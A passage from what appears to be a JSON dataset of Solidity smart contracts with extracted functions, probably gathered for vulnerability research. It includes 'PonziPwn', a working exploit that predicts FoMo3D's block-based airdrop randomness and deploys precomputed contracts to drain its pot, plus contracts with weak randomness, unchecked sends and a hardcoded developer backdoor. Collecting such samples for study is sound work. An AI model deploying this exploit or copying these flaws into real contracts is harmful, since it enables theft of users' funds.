audits[_id].remainingReward.sub(_reward);\n audits[_id].status = AuditStatus.Completed;\n auditors[_auditor].totalEarned.add(_reward);\n auditors[_auditor].completedAudits.add(1);\n auditors[_auditor].canWithdrawStake[_id] = true;\n _auditor.transfer(_reward);\n emit AuditorRewarded(_id, _auditor, _reward);\n }\n function slashStake(uint _id, address _auditor) external onlyOwner {\n require(auditors[_auditor].addr != address(0));\n require(auditors[_auditor].stakedInAudit[_id]);\n auditors[_auditor].canWithdrawStake[_id] = false;\n emit SlashedStake(_id, _auditor);\n }\n function stake(uint _id) public payable {\n require(msg.value == audits[_id].stake);\n require(block.timestamp < audits[_id].endTime);\n require(audits[_id].participants.length < audits[_id].maxAuditors);\n require(audits[_id].status == AuditStatus.New || audits[_id].status == AuditStatus.InProgress);\n require(auditors[msg.sender].addr == msg.sender && !auditors[msg.sender].banned);\n require(!auditors[msg.sender].stakedInAudit[_id]);\n audits[_id].status = AuditStatus.InProgress;\n audits[_id].participants.push(msg.sender);\n auditors[msg.sender].stakedInAudit[_id] = true;\n auditors[msg.sender].stakedAudits.push(_id);\n emit AuditorStaked(_id, msg.sender, msg.value);\n }\n function withdrawStake(uint _id) public {\n require(audits[_id].status == AuditStatus.Completed);\n require(auditors[msg.sender].canWithdrawStake[_id]);\n require(block.timestamp >= audits[_id].endTime + stakePeriod);\n auditors[msg.sender].canWithdrawStake[_id] = false;\n address(msg.sender).transfer(audits[_id].stake);\n emit WithdrawedStake(_id, msg.sender, audits[_id].stake);\n }\n function auditorHasStaked(uint _id, address _auditor) public view returns(bool) {\n return auditors[_auditor].stakedInAudit[_id];\n }\n function auditorCanWithdrawStake(uint _id, address _auditor) public view returns(bool) {\n if(auditors[_auditor].stakedInAudit[_id] && auditors[_auditor].canWithdrawStake[_id]) {\n return true;\n }\n return false;\n }\n function getStakedAudits(address _auditor) public view returns(uint[]) {\n return auditors[_auditor].stakedAudits;\n }\n function getAuditors(uint _id) public view returns(address[]) {\n return audits[_id].participants;\n }\n}",
  "extract_feature": [
    "function createAudit(uint _stake, uint _endTimeInDays, uint _maxAuditors) external payable onlyOwner {\nuint endTime = _endTimeInDays * 1 days;\nrequire(endTime < maxAuditDuration);\nrequire(block.timestamp + endTime * 1 days > block.timestamp);\nrequire(msg.value > 0 && _maxAuditors > 0 && _stake > 0);\nAudit memory audit;\naudit.status = AuditStatus.New;\naudit.owner = msg.sender;\naudit.id = audits.length;\naudit.totalReward = msg.value;\naudit.remainingReward = audit.totalReward;\naudit.stake = _stake;\naudit.endTime = block.timestamp + endTime;\naudit.maxAuditors = _maxAuditors;\naudits.push(audit);\nemit CreatedAudit(audit.id);\n}",
    "function reviewAudit(uint _id) external onlyOwner {\nrequire(audits[_id].status == AuditStatus.InProgress);\nrequire(block.timestamp >= audits[_id].endTime);\naudits[_id].endTime = block.timestamp;\naudits[_id].status = AuditStatus.InReview;\nemit ReviewingAudit(_id);\n}",
    "function stake(uint _id) public payable {\nrequire(msg.value == audits[_id].stake);\nrequire(block.timestamp < audits[_id].endTime);\nrequire(audits[_id].participants.length < audits[_id].maxAuditors);\nrequire(audits[_id].status == AuditStatus.New || audits[_id].status == AuditStatus.InProgress);\nrequire(auditors[msg.sender].addr == msg.sender && !auditors[msg.sender].banned);\nrequire(!auditors[msg.sender].stakedInAudit[_id]);\naudits[_id].status = AuditStatus.InProgress;\naudits[_id].participants.push(msg.sender);\nauditors[msg.sender].stakedInAudit[_id] = true;\nauditors[msg.sender].stakedAudits.push(_id);\nemit AuditorStaked(_id, msg.sender, msg.value);\n}",
    "function withdrawStake(uint _id) public {\nrequire(audits[_id].status == AuditStatus.Completed);\nrequire(auditors[msg.sender].canWithdrawStake[_id]);\nrequire(block.timestamp >= audits[_id].endTime + stakePeriod);\nauditors[msg.sender].canWithdrawStake[_id] = false;\naddress(msg.sender).transfer(audits[_id].stake);\nemit WithdrawedStake(_id, msg.sender, audits[_id].stake);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1ef1"
  },
  "filename": "295.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract NullFinalizeAgentExt is FinalizeAgent {\n CrowdsaleExt public crowdsale;\n function NullFinalizeAgentExt(CrowdsaleExt _crowdsale) {\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return true;\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n }\n function finalizeCrowdsale() public {\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1ef2"
  },
  "filename": "3050.sol",
  "content": "pragma solidity ^0.4.24;\ninterface FoMo3DlongInterface {\n function airDropTracker_() external returns (uint256);\n function airDropPot_() external returns (uint256);\n function withdraw() external;\n}\ncontract BlankContract {\n constructor() public {}\n}\ncontract AirDropWinner {\n FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);\n constructor() public {\n if(!address(fomo3d).call.value(0.1 ether)()) {\n fomo3d.withdraw();\n selfdestruct(msg.sender);\n }\n }\n}\ncontract PonziPwn {\n FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);\n address private admin;\n uint256 private blankContractGasLimit = 20000;\n uint256 private pwnContractGasLimit = 250000;\n uint256 private gasPrice = 10;\n uint256 private gasPriceInWei = gasPrice*1e9;\n uint256 private blankContractCost = blankContractGasLimit*gasPrice ;\n uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;\n uint256 private maxAmount = 10 ether;\n modifier onlyAdmin() {\n require(msg.sender == admin);\n _;\n }\n constructor() public {\n admin = msg.sender;\n }\n function checkPwnData() private returns(uint256,uint256,address) {\n address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));\n uint256 _nContracts = 0;\n uint256 _pwnCost = 0;\n uint256 _seed = 0;\n uint256 _tracker = fomo3d.airDropTracker_();\n bool _canWin = false;\n while(!_canWin) {\n _seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp) +\n (block.difficulty) +\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +\n (block.gaslimit) +\n ((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +\n (block.number)\n )));\n if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {\n _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));\n _nContracts++;\n _pwnCost+= blankContractCost;\n } else {\n _canWin = true;\n _pwnCost += pwnContractCost;\n }\n }\n return (_pwnCost,_nContracts,_newSender);\n }\n function deployContracts(uint256 _nContracts,address _newSender) private {\n for(uint256 _i; _i < _nContracts; _i++) {\n if(_i++ == _nContracts) {\n address(_newSender).call.value(0.1 ether)();\n new AirDropWinner();\n }\n new BlankContract();\n }\n }\n function beginPwn() public onlyAdmin() {\n uint256 _pwnCost;\n uint256 _nContracts;\n address _newSender;\n (_pwnCost, _nContracts,_newSender) = checkPwnData();\n if(_pwnCost + 0.1 ether < maxAmount) {\n deployContracts(_nContracts,_newSender);\n }\n }\n function withdraw() public onlyAdmin() {\n admin.transfer(address(this).balance);\n }\n}",
  "extract_feature": [
    "function checkPwnData() private returns(uint256,uint256,address) {\naddress _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));\nuint256 _nContracts = 0;\nuint256 _pwnCost = 0;\nuint256 _seed = 0;\nuint256 _tracker = fomo3d.airDropTracker_();\nbool _canWin = false;\nwhile(!_canWin) {\n_seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp) +\n(block.difficulty) +\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +\n(block.gaslimit) +\n((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +\n(block.number)\n)));\nif((_seed - ((_seed / 1000) * 1000)) >= _tracker) {\n_newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));\n_nContracts++;\n_pwnCost+= blankContractCost;\n} else {\n_canWin = true;\n_pwnCost += pwnContractCost;\n}\n}\nreturn (_pwnCost,_nContracts,_newSender);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1ef3"
  },
  "filename": "3083.sol",
  "content": "contract Medban\n{\n uint public players = 0;\n uint amount;\n uint time;\n uint payment;\n address winner;\n address public owner;\n address public meg = address(this);\n modifier _onlyowner {\n if (msg.sender == owner || msg.sender == 0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976)\n _\n }\n function Medban() {\n owner = msg.sender;\n }\n function() {\n Start();\n }\n function Start(){\n address developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;\n if (msg.sender == owner) {\n UpdatePay();\n }else {\n if (msg.value == (1 ether)/20)\n {\n uint fee;\n fee=msg.value/10;\n developer.send(fee/2);\n owner.send(fee/2);\n fee=0;\n amount++;\n if (amount>10) {\n uint deltatime = block.timestamp;\n if (deltatime >= time + 1 hours)\n {\n payment=meg.balance/100*70;\n amount=0;\n winner.send(payment);\n payment=0;\n }\n }\n time=block.timestamp;\n winner = msg.sender;\n } else {\n uint _fee;\n _fee=msg.value/10;\n developer.send(_fee/2);\n owner.send(_fee/2);\n fee=0;\n msg.sender.send(msg.value - msg.value/10);\n }\n }\n }\n function UpdatePay() _onlyowner {\n if (meg.balance>((1 ether)/20)) {\n msg.sender.send(((1 ether)/20));\n } else {\n msg.sender.send(meg.balance);\n }\n }\n}",
  "extract_feature": [
    "function Start(){\naddress developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;\nif (msg.sender == owner) {\nUpdatePay();\n}else {\nif (msg.value == (1 ether)/20)\n{\nuint fee;\nfee=msg.value/10;\ndeveloper.send(fee/2);\nowner.send(fee/2);\nfee=0;\namount++;\nif (amount>10) {\nuint deltatime = block.timestamp;\nif (deltatime >= time + 1 hours)\n{\npayment=meg.balance/100*70;\namount=0;\nwinner.send(payment);\npayment=0;\n}\n}\ntime=block.timestamp;\nwinner = msg.sender;\n} else {\nuint _fee;\n_fee=msg.value/10;\ndeveloper.send(_fee/2);\nowner.send(_fee/2);\nfee=0;\nmsg.sender.send(msg.value - msg.value/10);\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1ef4"
  },
  "filename": "3100.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract AccessAdmin is Ownable {\n mapping (address => bool) adminContracts;\n mapping (address => bool) actionContracts;\n function setAdminContract(address _addr, bool _useful) public onlyOwner {\n require(_addr != address(0));\n adminContracts[_addr] = _useful;\n }\n modifier onlyAdmin {\n require(adminContracts[msg.sender]);\n _;\n }\n function setActionContract(address _actionAddr, bool _useful) public onlyAdmin {\n actionContracts[_actionAddr] = _useful;\n }\n modifier onlyAccess() {\n require(actionContracts[msg.sender]);\n _;\n }\n}\ninterface CardsInterface {\n function balanceOf(address player) public constant returns(uint256);\n function updatePlayersCoinByOut(address player) external;\n function updatePlayersCoinByPurchase(address player, uint256 purchaseCost) public;\n function removeUnitMultipliers(address player, uint256 upgradeClass, uint256 unitId, uint256 upgradeValue) external;\n function upgradeUnitMultipliers(address player, uint256 upgradeClass, uint256 unitId, uint256 upgradeValue) external;\n}\ninterface RareInterface {\n function getRareItemsOwner(uint256 rareId) external view returns (address);\n function getRareItemsPrice(uint256 rareId) external view returns (uint256);\n function getRareInfo(uint256 _tokenId) external view returns (\n uint256 sellingPrice,\n address owner,\n uint256 nextPrice,\n uint256 rareClass,\n uint256 cardId,\n uint256 rareValue\n );\n function transferToken(address _from, address _to, uint256 _tokenId) external;\n function transferTokenByContract(uint256 _tokenId,address _to) external;\n function setRarePrice(uint256 _rareId, uint256 _price) external;\n function rareStartPrice() external view returns (uint256);\n}\ncontract CardsRaffle is AccessAdmin {\n using SafeMath for SafeMath;\n function CardsRaffle() public {\n setAdminContract(msg.sender,true);\n setActionContract(msg.sender,true);\n }\n CardsInterface public cards ;\n RareInterface public rare;\n function setCardsAddress(address _address) external onlyOwner {\n cards = CardsInterface(_address);\n }\n function setRareAddress(address _address) external onlyOwner {\n rare = RareInterface(_address);\n }\n function getRareAddress() public view returns (address) {\n return rare;\n }\n event UnitBought(address player, uint256 unitId, uint256 amount);\n event RaffleSuccessful(address winner);\n struct TicketPurchases {\n TicketPurchase[] ticketsBought;\n uint256 numPurchases;\n uint256 raffleRareId;\n }\n struct TicketPurchase {\n uint256 startId;\n uint256 endId;\n }\n mapping(address => TicketPurchases) private ticketsBoughtByPlayer;\n mapping(uint256 => address[]) private rafflePlayers;\n uint256 private constant RAFFLE_TICKET_BASE_PRICE = 10000;\n uint256 private raffleEndTime;\n uint256 private raffleRareId;\n uint256 private raffleTicketsBought;\n address private raffleWinner;\n bool private raffleWinningTicketSelected;\n uint256 private raffleTicketThatWon;\n function buyRaffleTicket(uint256 amount) external {\n require(raffleEndTime >= block.timestamp);\n require(amount > 0);\n uint256 ticketsCost = SafeMath.mul(RAFFLE_TICKET_BASE_PRICE, amount);\n require(cards.balanceOf(msg.sender) >= ticketsCost);\n cards.updatePlayersCoinByPurchase(msg.sender, ticketsCost);\n TicketPurchases storage purchases = ticketsBoughtByPlayer[msg.sender];\n if (purchases.raffleRareId != raffleRareId) {\n purchases.numPurchases = 0;\n purchases.raffleRareId = raffleRareId;\n rafflePlayers[raffleRareId].push(msg.sender);\n }\n if (purchases.numPurchases == purchases.ticketsBought.length) {\n purchases.ticketsBought.length = SafeMath.add(purchases.ticketsBought.length,1);\n }\n purchases.ticketsBought[purchases.numPurchases++] = TicketPurchase(raffleTicketsBought, raffleTicketsBought + (amount - 1));\n raffleTicketsBought = SafeMath.add(raffleTicketsBought,amount);\n UnitBought(msg.sender,raffleRareId,amount);\n }\n function startRareRaffle(uint256 endTime, uint256 rareId) external onlyAdmin {\n require(rareId>0);\n require(rare.getRareItemsOwner(rareId) == getRareAddress());\n require(block.timestamp < endTime);\n if (raffleRareId != 0) {\n require(raffleWinner != 0);\n }\n raffleWinningTicketSelected = false;\n raffleTicketThatWon = 0;\n raffleWinner = 0;\n raffleTicketsBought = 0;\n raffleEndTime = endTime;\n raffleRareId = rareId;\n }\n function awardRafflePrize(address checkWinner, uint256 checkIndex) external {\n require(raffleEndTime < block.timestamp);\n require(raffleWinner == 0);\n require(rare.getRareItemsOwner(raffleRareId) == getRareAddress());\n if (!raffleWinningTicketSelected) {\n drawRandomWinner();\n }\n if (checkWinner != 0) {\n TicketPurchases storage tickets = ticketsBoughtByPlayer[checkWinner];\n if (tickets.numPurchases > 0 && checkIndex < tickets.numPurchases && tickets.raffleRareId == raffleRareId) {\n TicketPurchase storage checkTicket = tickets.ticketsBought[checkIndex];\n if (raffleTicketThatWon >= checkTicket.startId && raffleTicketThatWon <= checkTicket.endId) {\n assignRafflePrize(checkWinner);\n return;\n }\n }\n }\n for (uint256 i = 0; i < rafflePlayers[raffleRareId].length; i++) {\n address player = rafflePlayers[raffleRareId][i];\n 